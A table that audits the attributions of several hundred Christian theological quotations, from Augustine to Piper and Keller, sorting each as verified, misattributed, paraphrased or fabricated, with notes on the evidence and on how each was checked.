| 186 | John Owen | The Mortification of Sin, I.2 | verified | web | exact, but ch. 7 (not I.2) — CCEL mort.i.x |
| 187 | John Owen | Communion with God | probably-genuine-but-unlocated | web | not in Communion with God (grep); likely conflation with Owen's 'easier see without eyes… than mortify one sin without the Spirit' |
| 188 | Jonathan Edwards | Resolutions, #5 | verified (well-known text; not web-checked in this audit) | desk | Resolutions 5 exact |
| 189 | Jonathan Edwards | Resolutions, #6 | verified (well-known text; not web-checked in this audit) | desk | Resolutions 6 exact |
| 190 | Jonathan Edwards | Religious Affections, I | verified (well-known text; not web-checked in this audit) | desk | Religious Affections I exact |
| 191 | John Bunyan | Pilgrim's Progress, Part II | verified (well-known text; not web-checked in this audit) | desk | PP Part II shepherd boy's song |
| 192 | Thomas Watson | tradition (Watson) | paraphrase-presented-as-quote | web | triad not in any Watson text; nearest 'his life is a veritable heaven on earth' (A Christian on the Mount) |
| 193 | Susanna Wesley (her sons John & Charles drew from her) | Covenant Prayer, A Plain Account of the People Called Methodists | misattributed | web | John Wesley's Covenant Service (1755) in the words of Richard Alleine (1663); text from Wesley's Directions (1780); no link to Susanna |
| 194 | Isaac Watts | When I Survey the Wondrous Cross, 1707 | verified (well-known text; not web-checked in this audit) | desk | 1707 exact |
| 195 | Charles Wesley | And Can It Be, 1738 | verified (well-known text; not web-checked in this audit) | desk | 1738 exact |
| 196 | Robert Robinson | Come Thou Fount, 1758 | verified (well-known text; not web-checked in this audit) | desk | 1758 exact |
| 197 | Augustus Toplady | Rock of Ages, 1763 | verified (well-known text; not web-checked in this audit) | desk | 1763/1776 exact |
| 198 | John Newton | Olney Hymns, 1779 | verified (well-known text; not web-checked in this audit) | desk | 1779 exact |
| 199 | William Cowper | Olney Hymns, 1779 | verified (well-known text; not web-checked in this audit) | desk | 1771/1779 exact |
| 200 | Frederick Faber | Souls of Men, Why Will Ye Scatter? 1854 | verified (well-known text; not web-checked in this audit) | desk | 1854/1862 exact |
| 201 | Fanny Crosby | Blessed Assurance, 1873 | verified (well-known text; not web-checked in this audit) | desk | 1873 exact |
| 202 | Horatio Spafford | It Is Well With My Soul, 1873 | verified (well-known text; not web-checked in this audit) | desk | 1873 exact |
| 203 | Charles Spurgeon | tradition (commonly Spurgeon, also Bonar) | paraphrase-presented-as-quote | web | modern compression; closest Spurgeon: 'the object of thy faith is nothing within thee' (None but Jesus, NPSP #361, 1861) |
| 204 | Charles Spurgeon | Sermon, 1861 | fabricated | web | Spurgeon Library '6 Quotes Spurgeon Didn't Say'; 'Sermon, 1861' is invented |
| 205 | Charles Spurgeon | tradition (often attributed) | misattributed | web | Babbie Mason / Eddie Carswell song 'Trust His Heart' (1989); Spurgeon's line is 'trusts him where he cannot trace him' (A Happy Christian) |
| 206 | Charles Spurgeon | Sermon | fabricated | web | no source in any Spurgeon work; PuritanBoard/Logos threads: unlocatable; circulates via H. Anderson 2018 |
| 207 | Charles Spurgeon | Sermon, 1865 | verified | web | The Ravens' Cry, MTP #672, 14 Jan 1866 ('moveth the muscles of Omnipotence'); date should be 1866 |
| 208 | Charles Spurgeon | Morning and Evening, August 11 | fabricated | web | Morning & Evening Aug 11 AM/PM contain nothing like it; CCEL full-text grep negative |
| 209 | Charles Spurgeon | Sermons | fabricated | web | no hit on spurgeon.org/CCEL/web |
| 210 | Jim Elliot (per Elisabeth Elliot) | Journal, October 28, 1949 | verified (well-known text; not web-checked in this audit) | desk | journal 28 Oct 1949 exact |
| 211 | Elisabeth Elliot | Keep a Quiet Heart | probably-genuine-but-unlocated | web | universally attributed to Elliot; no book confirmed (likely newsletter/Gateway to Joy); duplicate of #794 with different ref |
| 212 | Corrie ten Boom | The Hiding Place | verified (well-known text; not web-checked in this audit) | desk | Betsie via Corrie, exact |
| 213 | Amy Carmichael | Gold by Moonlight | misattributed | web | 'In acceptance lieth peace' = her poem in Toward Jerusalem (1936), not Gold by Moonlight; first sentence untraceable |
| 214 | Hannah Whitall Smith | The Christian's Secret of a Happy Life, ch. 6 | paraphrase-presented-as-quote | web | CCEL full text: no 'hourly surrender'; nearest ch. 15 'a submissive acceptance of the will of God…hourly'; ch. 6 is 'Difficulties Concerning Faith' |
| 215 | Dietrich Bonhoeffer | The Cost of Discipleship, ch. 4 | verified (well-known text; not web-checked in this audit) | desk | ch. 4 exact |
| 216 | Dietrich Bonhoeffer | The Cost of Discipleship | verified (well-known text; not web-checked in this audit) | desk | ch. 1 opening exact |
| 217 | J. Gresham Machen | Christianity and Liberalism | verified (well-known text; not web-checked in this audit) | desk | C&L exact |
| 218 | J.I. Packer | Knowing God | verified (well-known text; not web-checked in this audit) | desk | ch. 3 exact |
| 219 | J.I. Packer | Knowing God, ch. 1 | verified | web | exact, but ch. 3 'Knowing and Being Known' (swapped with #660) |
| 220 | John Piper | Desiring God | verified (well-known text; not web-checked in this audit) | desk | exact |
| 221 | John Piper | Don't Waste Your Life | paraphrase-presented-as-quote | desk | book title presented as a quotation |
| 222 | Tim Keller | tradition (Keller, frequently) | verified (well-known text; not web-checked in this audit) | desk | Keller's standard formulation |
| 223 | Martyn Lloyd-Jones | Spiritual Depression, ch. 1 | verified (well-known text; not web-checked in this audit) | desk | ch. 1 exact |
| 224 | Herman Bavinck | Reformed Dogmatics, I | verified (well-known text; not web-checked in this audit) | desk | Bavinck's recurring formula 'grace restores nature' (RD III:577 etc.) |
| 225 | Herman Bavinck | Reformed Dogmatics, II | verified (well-known text; not web-checked in this audit) | desk | RD II:29 'Mystery is the lifeblood of dogmatics' |
| 226 | R.C. Sproul | The Holiness of God, ch. 2 | paraphrase-presented-as-quote | desk |  |
| 227 | R.C. Sproul | tradition (Sproul, paraphrasing the Reformers) | paraphrase-presented-as-quote | desk |  |
| 228 | D.A. Carson | The Gagging of God, ch. 1 | fabricated | web | no trace in Carson or reviews of Gagging of God |
| 229 | D.A. Carson | For the Love of God, vol. 2 | verified (well-known text; not web-checked in this audit) | desk | FLG vol. 2 exact |
| 230 | Sinclair Ferguson | The Whole Christ, ch. 7 | paraphrase-presented-as-quote | web | unlocated in The Whole Christ; genuine idea: 'never offering the benefits of the gospel without the Benefactor Himself' |
| 231 | Kevin Vanhoozer | The Drama of Doctrine, ch. 1 | fabricated | web | phrase appears nowhere; Vanhoozer's play is 'faith speaking understanding' |
| 232 | Michael Reeves | Delighting in the Trinity, ch. 1 | paraphrase-presented-as-quote | web | splice of Reeves lines ('God is love because God is a Trinity'; 'the Father has loved the Son in the Spirit') |
| 233 | C.S. Lewis | Mere Christianity | verified (well-known text; not web-checked in this audit) | desk | Book III ch. 10 |
| 234 | C.S. Lewis | Mere Christianity | verified (well-known text; not web-checked in this audit) | desk | Book III ch. 10 exact |
| 235 | C.S. Lewis | The Weight of Glory | verified (well-known text; not web-checked in this audit) | desk | exact |
| 236 | C.S. Lewis | Mere Christianity | verified (well-known text; not web-checked in this audit) | desk | Book III ch. 8 |
| 237 | C.S. Lewis | God in the Dock | verified (well-known text; not web-checked in this audit) | desk | 'Christian Apologetics' exact |
| 238 | C.S. Lewis | Letters to Malcolm | verified (well-known text; not web-checked in this audit) | desk | ch. 17 exact |
| 239 | G.K. Chesterton | What's Wrong with the World | verified (well-known text; not web-checked in this audit) | desk | paraphrase of the exact line shipped at #779 (duplicate) |
| 240 | Westminster Divines | Westminster Shorter Catechism, Q1 | paraphrase-presented-as-quote | desk | WSC Q1 actual: 'Man's chief end is to glorify God, and to enjoy him for ever' |
| 583 | Augustine | Homilies on the First Epistle of John, VII.8 | verified (well-known text; not web-checked in this audit) | desk | Hom. 1 John VII.8 exact |
| 584 | Augustine | Confessions, VIII.12 | verified (well-known text; not web-checked in this audit) | desk | VIII.12 (Pusey) |
| 585 | Augustine | Sermon 117.5 (Si comprehendis, non est Deus) | verified (well-known text; not web-checked in this audit) | desk | Sermo 117.3.5 |
| 586 | Augustine | Soliloquies, I.2.7 | verified (well-known text; not web-checked in this audit) | desk | Soliloquies I.2.7 exact |
| 587 | Augustine | City of God, XIV.28 | verified (well-known text; not web-checked in this audit) | desk | XIV.28 exact |
| 588 | Athanasius | On the Incarnation, §17 | verified (well-known text; not web-checked in this audit) | desk | §17 exact |
| 589 | Athanasius | On the Incarnation, §6 | verified (well-known text; not web-checked in this audit) | desk | §6 exact |
| 590 | Athanasius | Festal Letter 39 (AD 367) | verified (well-known text; not web-checked in this audit) | desk | Festal Letter 39 exact |
| 591 | Thomas Aquinas | Summa Theologiae, I.1.1 | verified (well-known text; not web-checked in this audit) | desk | I.1.1 exact |
| 592 | Thomas Aquinas | Summa Theologiae, II-II.27.2 | misattributed | web | Augustine, De Doctrina Christiana III.10.16 (newadvent); ST II-II.27.2 is on whether love is a passion/act |
| 593 | Thomas Aquinas | Adoro Te Devote, stanza 1 | verified (well-known text; not web-checked in this audit) | desk | traditional attribution, c. 1264 |
| 594 | Thomas Aquinas | Summa Contra Gentiles, III.37 | paraphrase-presented-as-quote | desk |  |
| 595 | Martin Luther | The Bondage of the Will, §25 | verified (well-known text; not web-checked in this audit) | desk | WA 18:635; '§25' is not a real division |
| 596 | Martin Luther | Heidelberg Disputation (1518), Thesis 21 | verified (well-known text; not web-checked in this audit) | desk | Thesis 21 exact |
| 597 | Martin Luther | Smalcald Articles, II.1 | verified (well-known text; not web-checked in this audit) | desk | Part II Art. I exact |
| 598 | Martin Luther | Commentary on Galatians (1535), on 2:20 | fabricated | web | not in Gutenberg / Project Wittenberg texts of the 1535 Galatians; nearest genuine is on 2:4-5 and differs |
| 599 | Martin Luther | The Freedom of a Christian (1520), opening theses | verified (well-known text; not web-checked in this audit) | desk | opening theses exact |
| 600 | Martin Luther | Ein feste Burg ist unser Gott (1529) | verified (well-known text; not web-checked in this audit) | desk | Hedge translation |
| 601 | Martin Luther | Ninety-Five Theses, #1 (variant translation) | verified (well-known text; not web-checked in this audit) | desk | duplicate of #178 |
| 602 | John Calvin | Institutes, III.2.7 | verified (well-known text; not web-checked in this audit) | desk | III.2.7 exact (Battles) |
| 603 | John Calvin | Institutes, III.20.2 | verified (well-known text; not web-checked in this audit) | desk | III.20.2 (Beveridge 'intercourse') |
| 604 | John Calvin | Institutes, IV.1.4 | verified (well-known text; not web-checked in this audit) | desk | IV.1.4 exact |
| 605 | John Calvin | Institutes, I.7.4 | verified (well-known text; not web-checked in this audit) | desk | I.7.4 exact |
| 606 | John Calvin | Institutes, III.11.1 | verified (well-known text; not web-checked in this audit) | desk | III.11.1 'main hinge' |
| 607 | John Calvin | Institutes, I.3.1 | verified (well-known text; not web-checked in this audit) | desk | I.3.1 exact |
| 608 | John Owen | The Mortification of Sin, ch. 7 | verified | web | exact, but ch. 14 (not 7) — CCEL mort.i.xvii |
| 609 | John Owen | The Glory of Christ (1684), ch. 2 | paraphrase-presented-as-quote | desk |  |
| 610 | John Owen | The Death of Death in the Death of Christ (1647), Book I | paraphrase-presented-as-quote | web | not in Owen (grep); 'possible vs certain' formula is Packer's 1959 introductory essay; triad summarises Book I chs 3-5 |
| 611 | John Owen | Spiritual Mindedness (1681), ch. 2 | probably-genuine-but-unlocated | desk |  |
| 612 | John Owen | The Mortification of Sin, ch. 1 | verified | web | 'whilst we are in this world' — ch. 2 (not 1) |
| 613 | John Owen | Pneumatologia (1674), Book I | probably-genuine-but-unlocated | web | not in Pneumatologia (grep); echoes John 3:27; unlocated |
| 614 | John Owen | Communion with God (1657), II.iv | paraphrase-presented-as-quote | web | idea is Owen's (Part II ch. 3-4); wording modern |
| 615 | Jonathan Edwards | The End for Which God Created the World (1765) | verified (well-known text; not web-checked in this audit) | desk | exact |
| 616 | Jonathan Edwards | Religious Affections (1746), Part I | verified (well-known text; not web-checked in this audit) | desk | exact |
| 617 | Jonathan Edwards | Religious Affections (1746), Sign XII | verified | web | Part III Sign XII: 'Christian practice, or a holy life, is a great and distinguishing sign of true and saving grace' |
| 618 | Jonathan Edwards | Heaven, A World of Love (sermon, 1738) | paraphrase-presented-as-quote | web | only 'Heaven is a world of love' is verbatim; rest not in charity16 text |
| 619 | Jonathan Edwards | Personal Narrative (c. 1739) | verified (well-known text; not web-checked in this audit) | desk | exact |
| 620 | Jonathan Edwards | Charity and Its Fruits (1738), Lecture I | paraphrase-presented-as-quote | web | genuine 'all… Christian virtue… summed up in love… as the stream from the fountain'; shipped clauses not in text |
| 621 | Jonathan Edwards | The Excellency of Christ (1738) | verified | web | doctrine statement of the 1736 sermon (pub. 1738) |
| 622 | B.B. Warfield | The Plan of Salvation (1915), ch. 1 | misattributed | web | 'Calvin as a Theologian and Calvinism Today' (1909) — not Plan of Salvation (full-text grep) |
| 623 | B.B. Warfield | Calvinism (1910) | paraphrase-presented-as-quote | desk | (unchecked; treated as paraphrase by default — modern-summary wording) |
| 624 | B.B. Warfield | The Inspiration of the Bible (1894) | paraphrase-presented-as-quote | desk | (unchecked; treated as paraphrase by default — modern-summary wording) |
| 625 | B.B. Warfield | Studies in Tertullian and Augustine (1930) | paraphrase-presented-as-quote | web | not in Studies in Tertullian and Augustine (grep) nor Plan of Salvation |
| 626 | B.B. Warfield | Selected Shorter Writings, vol. 1 (paraphrasing his argument) | paraphrase-presented-as-quote | desk | ref itself says 'paraphrasing his argument' |
| 627 | B.B. Warfield | Perfectionism (1931 posth.), vol. I (summary of argument) | paraphrase-presented-as-quote | desk | ref itself says 'summary of argument' |
| 628 | Geerhardus Vos | The Pauline Eschatology (1930), Preface | probably-genuine-but-unlocated | desk |  |
| 629 | Geerhardus Vos | Biblical Theology: Old and New Testaments (1948), ch. 1 | paraphrase-presented-as-quote | desk |  |
| 630 | Geerhardus Vos | Grace and Glory (1922), sermon collection | fabricated | web | not in Grace and Glory (archive.org full text); modern devotional diction |
| 631 | Geerhardus Vos | The Teaching of Jesus Concerning the Kingdom and the Church (1903), ch. 2 | paraphrase-presented-as-quote | desk |  |
| 632 | Geerhardus Vos | The Pauline Eschatology (1930), ch. 1 | paraphrase-presented-as-quote | desk |  |
| 633 | Herman Bavinck | Reformed Dogmatics, I (Prolegomena) | paraphrase-presented-as-quote | desk |  |
| 634 | Herman Bavinck | Reformed Dogmatics, II (God and Creation) | verified (well-known text; not web-checked in this audit) | desk | RD II:260 'the heart and center of the whole revelation of God' (close) |
| 635 | Herman Bavinck | Reformed Dogmatics, III (Sin and Salvation in Christ) | paraphrase-presented-as-quote | web | 'not two messages but one' not found; genuine RD III §362 wording differs |
| 636 | Herman Bavinck | Reformed Dogmatics, IV (Holy Spirit, Church, and New Creation) | paraphrase-presented-as-quote | web | wording not found; idea from 1888 Kampen address 'Catholicity of Christianity and the Church' |
| 637 | Herman Bavinck | Reformed Dogmatics, II (paraphrasing his argument) | paraphrase-presented-as-quote | desk | ref itself says 'paraphrasing his argument' |
| 638 | J. Gresham Machen | Christianity and Liberalism (1923), ch. 7 | paraphrase-presented-as-quote | desk | (unchecked; treated as paraphrase by default — modern-summary wording) |
| 639 | J. Gresham Machen | What Is Faith? (1925), ch. 1 | paraphrase-presented-as-quote | web | Monergism PDF grep: no 'recognition of a fact'; actual: 'Faith is the acceptance of a gift at the hands of Christ' |
| 640 | J. Gresham Machen | Christianity and Liberalism (1923), ch. 2 | paraphrase-presented-as-quote | web | actual ch. 2: 'a way of life founded upon a message… based upon doctrine'; 'news' is a gloss |
| 641 | J. Gresham Machen | The Origin of Paul's Religion (1921), ch. 1 | paraphrase-presented-as-quote | desk |  |
| 642 | J. Gresham Machen | The Christian Faith in the Modern World (1936) | paraphrase-presented-as-quote | desk |  |
| 643 | C.S. Lewis | Mere Christianity, Book II, ch. 3 | verified (well-known text; not web-checked in this audit) | desk | Book II ch. 3 |
| 644 | C.S. Lewis | The Four Loves, ch. 6 | verified (well-known text; not web-checked in this audit) | desk | ch. 6 'Charity' exact |
| 645 | C.S. Lewis | Surprised by Joy, ch. 14 | verified (well-known text; not web-checked in this audit) | desk |  |
| 646 | C.S. Lewis | Reflections on the Psalms, ch. 9 | verified (well-known text; not web-checked in this audit) | desk | ch. 9 exact |
| 647 | Martyn Lloyd-Jones | Preaching and Preachers (1971), ch. 4 | verified (well-known text; not web-checked in this audit) | desk | ch. 5 'The Act of Preaching' (not 4) |
| 648 | Martyn Lloyd-Jones | Studies in the Sermon on the Mount, vol. 1 | paraphrase-presented-as-quote | desk |  |
| 649 | Martyn Lloyd-Jones | Studies in the Sermon on the Mount, vol. 2 (Salt and Light) | paraphrase-presented-as-quote | desk |  |
| 650 | Martyn Lloyd-Jones | The Cross (1986) | fabricated | web | no hit on mljtrust.org/goodreads/web |
| 651 | Martyn Lloyd-Jones | Joy Unspeakable (1984) | paraphrase-presented-as-quote | desk |  |
| 652 | Dietrich Bonhoeffer | Life Together (1939), ch. 1 | verified (well-known text; not web-checked in this audit) | desk | exact |
| 653 | Dietrich Bonhoeffer | Life Together (1939), ch. 1 | verified (well-known text; not web-checked in this audit) | desk | exact |
| 654 | Dietrich Bonhoeffer | The Cost of Discipleship (1937), ch. 1 | verified (well-known text; not web-checked in this audit) | desk | exact |
| 655 | Dietrich Bonhoeffer | The Cost of Discipleship (1937), ch. 1 | verified (well-known text; not web-checked in this audit) | desk | exact |
| 656 | Dietrich Bonhoeffer | Letters and Papers from Prison (1944), letter of 16 July | verified (well-known text; not web-checked in this audit) | desk | 16 Jul 1944 exact |
| 657 | Dietrich Bonhoeffer | Letters and Papers from Prison, 'After Ten Years' (Christmas 1942) | verified (well-known text; not web-checked in this audit) | desk | exact |
| 658 | Dietrich Bonhoeffer | Letters and Papers from Prison, 21 July 1944 | verified (well-known text; not web-checked in this audit) | desk | 21 Jul 1944 exact |
| 659 | Dietrich Bonhoeffer | Ethics (1949, posth.), 'Guilt, Justification, Renewal' | paraphrase-presented-as-quote | desk |  |
| 660 | J.I. Packer | Knowing God (1973), ch. 3 | verified | web | exact ('blindfold'), but ch. 1 'The Study of God' (swapped with #219) |
| 661 | J.I. Packer | Knowing God (1973), ch. 9 ('God's Wisdom and Ours') | verified | web | exact (Knowing God); but ch. 9 is 'God Only Wise'; 'God's Wisdom and Ours' is ch. 10 |
| 662 | J.I. Packer | Knowing God (1973), ch. 19 ('Sons of God') | verified (well-known text; not web-checked in this audit) | desk | ch. 19 exact |
| 663 | J.I. Packer | Knowing God (1973), ch. 18 ('The Heart of the Gospel') | verified (well-known text; not web-checked in this audit) | desk | ch. 18 exact |
| 664 | J.I. Packer | Knowing God (1973), ch. 12 ('The Love of God') | probably-genuine-but-unlocated | desk |  |
| 665 | J.I. Packer | A Quest for Godliness (1990), Introduction | fabricated | web | no trace in Packer or reviews |
| 666 | J.I. Packer | Concise Theology (1993), 'The Gospel' | paraphrase-presented-as-quote | desk |  |
| 667 | J.I. Packer | Knowing God (1973), ch. 1 | probably-genuine-but-unlocated | desk |  |
| 668 | Charles Spurgeon | Sermon, 'Sovereign Grace and Man's Responsibility' (1858) | paraphrase-presented-as-quote | web | NPSP #207 (1858) exists but lacks the wording; 'Salvation is of the Lord' expounded in NPSP #131 (1857); 'marrow of all theology' not his |
| 669 | Charles Spurgeon | Sermon on Hebrews 7:25 (1879) | paraphrase-presented-as-quote | web | Salvation to the Uttermost, NPSP #84, 8 Jun 1856 — not 1879; wording differs |
| 670 | R.C. Sproul | The Holiness of God (1985), ch. 1 | paraphrase-presented-as-quote | desk |  |
| 671 | R.C. Sproul | Chosen by God (1986) | paraphrase-presented-as-quote | desk |  |
| 672 | R.C. Sproul | Chosen by God (1986) | verified (well-known text; not web-checked in this audit) | desk | Chosen by God pp. 26-27 exact |
| 673 | R.C. Sproul | The Truth of the Cross (2007) | paraphrase-presented-as-quote | desk |  |
| 674 | R.C. Sproul | Pleasing God (1988) | paraphrase-presented-as-quote | desk |  |
| 675 | R.C. Sproul | Tabletalk magazine, masthead (recurring) | verified (well-known text; not web-checked in this audit) | desk | Sproul tagline |
| 676 | R.C. Sproul | Essential Truths of the Christian Faith (1992) | paraphrase-presented-as-quote | desk |  |
| 677 | R.C. Sproul | The Holiness of God (1985) | paraphrase-presented-as-quote | desk |  |
| 678 | John Piper | Desiring God (1986), Preface | verified (well-known text; not web-checked in this audit) | desk | exact |
| 679 | John Piper | Future Grace (1995) | paraphrase-presented-as-quote | desk |  |
| 680 | John Piper | Brothers, We Are Not Professionals (2002) | fabricated | web | no trace; Piper's ch. 1 line is 'Professionalism has nothing to do with the essence and heart of the Christian ministry' |
| 681 | John Piper | Let the Nations Be Glad! (1993), ch. 1 | verified (well-known text; not web-checked in this audit) | desk | exact |
| 682 | John Piper | Coronavirus and Christ (2020) | paraphrase-presented-as-quote | desk |  |
| 683 | John Piper | Spectacular Sins (2008) | paraphrase-presented-as-quote | desk |  |
| 684 | John Piper | The Future of Justification (2007) | paraphrase-presented-as-quote | desk |  |
| 685 | John Piper | Desiring God (1986), ch. 1 | paraphrase-presented-as-quote | desk |  |
| 686 | Tim Keller | Prayer (2014), Preface | verified | web | exact; located in Part One ch. 1/2, not the Preface |
| 687 | Tim Keller | The Prodigal God (2008), ch. 4 | verified | web | exact; located in the Introduction, not ch. 4 |
| 688 | Tim Keller | Counterfeit Gods (2009), Introduction | paraphrase-presented-as-quote | desk |  |
| 689 | Tim Keller | The Reason for God (2008), ch. 2 | misattributed | web | exact wording, but from Walking with God through Pain and Suffering (2013) ch. 1, not Reason for God |
| 690 | Tim Keller | The Meaning of Marriage (2011), ch. 4 | verified (well-known text; not web-checked in this audit) | desk | exact |
| 691 | Tim Keller | Center Church (2012), ch. 1 | verified (well-known text; not web-checked in this audit) | desk | Center Church exact |
| 692 | Tim Keller | Walking with God Through Pain and Suffering (2013), ch. 1 | paraphrase-presented-as-quote | desk |  |
| 693 | Richard Sibbes | The Bruised Reed (1630), ch. 1 | verified (well-known text; not web-checked in this audit) | desk | Bruised Reed ch. 2 (not 1) |
| 694 | Richard Sibbes | The Bruised Reed (1630), ch. 2 | verified (well-known text; not web-checked in this audit) | desk | Bruised Reed ch. 2, exact |
| 695 | Richard Sibbes | The Bruised Reed (1630), ch. 6 | probably-genuine-but-unlocated | desk |  |
| 696 | Thomas Goodwin | The Heart of Christ in Heaven Towards Sinners on Earth (1651) | paraphrase-presented-as-quote | desk |  |
| 697 | Thomas Goodwin | Christ Set Forth (1642) | fabricated | web | not in Christ Set Forth (grep 'robe','loaned' = 0); modern composite |
| 698 | Thomas Goodwin | Of the Knowledge of God the Father (1651) | paraphrase-presented-as-quote | web | 'fountain of Deity' not in text; phrase is Calvin Inst. I.13.25 / patristic; Goodwin argues the substance |
| 699 | Stephen Charnock | The Existence and Attributes of God (1682), Discourse I | paraphrase-presented-as-quote | web | not verbatim; genuine Discourse I: Satan 'cannot raze out the thoughts of a Deity' |
| 700 | Stephen Charnock | The Existence and Attributes of God (1682), Discourse on the Goodness of God | probably-genuine-but-unlocated | desk |  |
| 701 | Stephen Charnock | The Existence and Attributes of God (1682), Discourse on the Holiness of God | probably-genuine-but-unlocated | desk |  |
| 702 | Thomas Watson | A Body of Divinity (1692), on the Word | fabricated | web | not in Body of Divinity (CCEL full text); four-part formula is a modern composite |
| 703 | Thomas Watson | The Doctrine of Repentance (1668) | verified (well-known text; not web-checked in this audit) | desk | exact definition |
| 704 | Thomas Watson | All Things for Good (1663) | paraphrase-presented-as-quote | desk |  |
| 705 | John Bunyan | The Pilgrim's Progress (1678), Part I | verified (well-known text; not web-checked in this audit) | desk | exact |
| 706 | John Bunyan | The Pilgrim's Progress (1678), Part I (Christian at the Cross) | verified (well-known text; not web-checked in this audit) | desk | exact |
| 707 | John Bunyan | Grace Abounding to the Chief of Sinners (1666) | probably-genuine-but-unlocated | desk |  |
| 708 | John Bunyan | The Holy War (1682) | paraphrase-presented-as-quote | desk |  |
| 709 | Thomas Manton | Sermons on Psalm 119 (Sermon I) | fabricated | web | not in Works vol. VI Ps 119 sermons; the maxim is Jerome, Ep. 22.25 |
| 710 | Thomas Manton | Sermon on John 17 | paraphrase-presented-as-quote | desk |  |
| 711 | Thomas Manton | Sermon on Psalm 23 | fabricated | web | Manton's Works contain no sermon on Psalm 23 |
| 712 | Jeremiah Burroughs | The Rare Jewel of Christian Contentment (1648), ch. 1 | verified (well-known text; not web-checked in this audit) | desk | ch. 1 definition, exact |
| 713 | Jeremiah Burroughs | The Rare Jewel of Christian Contentment (1648), ch. 2 | paraphrase-presented-as-quote | desk |  |
| 714 | Jeremiah Burroughs | The Rare Jewel of Christian Contentment (1648), ch. 12 | paraphrase-presented-as-quote | web | antithesis not in text (grep); genuine: contentment 'from the covenant promises' |
| 715 | Thomas Boston | Human Nature in its Fourfold State (1720), Introduction | paraphrase-presented-as-quote | desk |  |
| 716 | Thomas Boston | Human Nature in its Fourfold State (1720), State II ('Natural Man') | paraphrase-presented-as-quote | desk |  |
| 717 | Thomas Boston | The Crook in the Lot (1737) | paraphrase-presented-as-quote | desk |  |
| 718 | John Chrysostom | Homilies on the Gospel of Matthew, 51 | probably-genuine-but-unlocated | web | floating internet quote; NOT in Hom. Matt 51 nor Liturgy-of-Hours 'Hom. 6 on Prayer'; source unlocated |
| 719 | John Chrysostom | Homilies on the Statues, II | fabricated | web | no trace in any Chrysostom text; not in Statues II |
| 720 | John Chrysostom | Last words, attributed (cf. Homily delivered in exile, 407) | paraphrase-presented-as-quote | desk | (unchecked; treated as paraphrase by default — modern-summary wording) |
| 721 | John Chrysostom | Homilies on the Gospel of John, 1 | paraphrase-presented-as-quote | desk |  |
| 722 | Cyprian of Carthage | On the Unity of the Church (251), §6 | paraphrase-presented-as-quote | desk | (unchecked; treated as paraphrase by default — modern-summary wording) |
| 723 | Cyprian of Carthage | On the Lord's Prayer (252) | fabricated | web | newadvent Treatise 4 grepped: nothing resembling it |
| 724 | Cyprian of Carthage | On Mortality (252), §22 | paraphrase-presented-as-quote | web | §22 genuine idea ('not an ending, but a transit'); second sentence is a modern gloss |
| 725 | Tertullian | Against Praxeas (c. 213), §2 | verified (well-known text; not web-checked in this audit) | desk | Adv. Prax. 2 (tres… non statu sed gradu) |
| 726 | Tertullian | On Prayer (c. 198), §1 | paraphrase-presented-as-quote | web | De oratione ch. 17: 'God is the hearer not of the voice, but of the heart'; §1 wrong, wording modern |
| 727 | Tertullian | Apology (c. 197), §17 | verified (well-known text; not web-checked in this audit) | desk | Apol. 17 anima naturaliter christiana |
| 728 | Gregory of Nazianzus | First Theological Oration (Oration 27), §3 | verified (well-known text; not web-checked in this audit) | desk | Or. 27 §3 exact |
| 729 | Anselm of Canterbury | Proslogion (1078), ch. 1 | verified (well-known text; not web-checked in this audit) | desk | duplicate of #170 |
| 730 | Anselm of Canterbury | Cur Deus Homo (1098), I.21 | verified (well-known text; not web-checked in this audit) | desk | duplicate of #171 |
| 731 | Anselm of Canterbury | Cur Deus Homo (1098), II.6 (summary of argument) | paraphrase-presented-as-quote | desk | ref itself says 'summary of argument' |
| 732 | Anselm of Canterbury | Proslogion (1078), ch. 1 | verified (well-known text; not web-checked in this audit) | desk | Proslogion 1 exact |
| 733 | Anselm of Canterbury | Proslogion (1078), Preface | paraphrase-presented-as-quote | desk |  |
| 734 | Brother Lawrence | The Practice of the Presence of God (1693), Conversation 4 | paraphrase-presented-as-quote | desk | (unchecked; treated as paraphrase by default — modern-summary wording) |
| 735 | Brother Lawrence | The Practice of the Presence of God (1693), Letter 4 | probably-genuine-but-unlocated | desk |  |
| 736 | Charles Hodge | Systematic Theology (1872), vol. 1, Introduction | verified (well-known text; not web-checked in this audit) | desk | exact |
| 737 | Charles Hodge | Systematic Theology (1872), vol. 1 | fabricated | web | no trace; Monergism PDF grep negative |
| 738 | Charles Hodge | Systematic Theology (1872), vol. 2, on the Atonement | paraphrase-presented-as-quote | desk |  |
| 739 | Charles Hodge | The Way of Life (1841) | fabricated | web | 306-page PDF grep: zero hits |
| 740 | Charles Hodge | Systematic Theology (1872), vol. 3 | paraphrase-presented-as-quote | desk |  |
| 741 | A.A. Hodge | Outlines of Theology (1860) | paraphrase-presented-as-quote | desk |  |
| 742 | A.A. Hodge | The Confession of Faith (1869) | misattributed | web | not in A.A. Hodge's Confession commentary (484 pp. grep); nearest real: Charles Hodge, Princeton Sermons 'faith… the eye of the soul' |
| 743 | John Murray | Redemption Accomplished and Applied (1955), Introduction | paraphrase-presented-as-quote | desk |  |
| 744 | John Murray | Redemption Accomplished and Applied (1955), ch. 1 | fabricated | web | zero hits; not Murray's register |
| 745 | John Murray | The Imputation of Adam's Sin (1959) | paraphrase-presented-as-quote | desk |  |
| 746 | John Murray | Principles of Conduct (1957), ch. 1 | paraphrase-presented-as-quote | desk |  |
| 747 | John Murray | Collected Writings, vol. 2 | fabricated | web | zero hits anywhere |
| 748 | Louis Berkhof | Systematic Theology (1932), Doctrine of God | misattributed | web | Job 36:26 KJV; Berkhof's 'Knowability of God' cites Job 11:7; tail is a gloss on 'God can be known only… in so far as He reveals Himself' |
| 749 | Louis Berkhof | Systematic Theology (1932), Christology | paraphrase-presented-as-quote | desk |  |
| 750 | Louis Berkhof | Systematic Theology (1932), on Sanctification | verified (well-known text; not web-checked in this audit) | desk | Berkhof's definition (close; 'gracious and continuous operation') |
| 751 | Louis Berkhof | Systematic Theology (1932), Eschatology | paraphrase-presented-as-quote | desk |  |
| 752 | Louis Berkhof | Manual of Christian Doctrine (1933) | paraphrase-presented-as-quote | desk |  |
| 753 | Anthony Hoekema | The Bible and the Future (1979), ch. 1 | paraphrase-presented-as-quote | desk |  |
| 754 | Anthony Hoekema | Created in God's Image (1986), ch. 1 | paraphrase-presented-as-quote | web | actual: 'the image of God is not something man has but something man is' (p. 95, ch. 5) |
| 755 | Anthony Hoekema | Saved by Grace (1989), ch. 1 | paraphrase-presented-as-quote | desk |  |
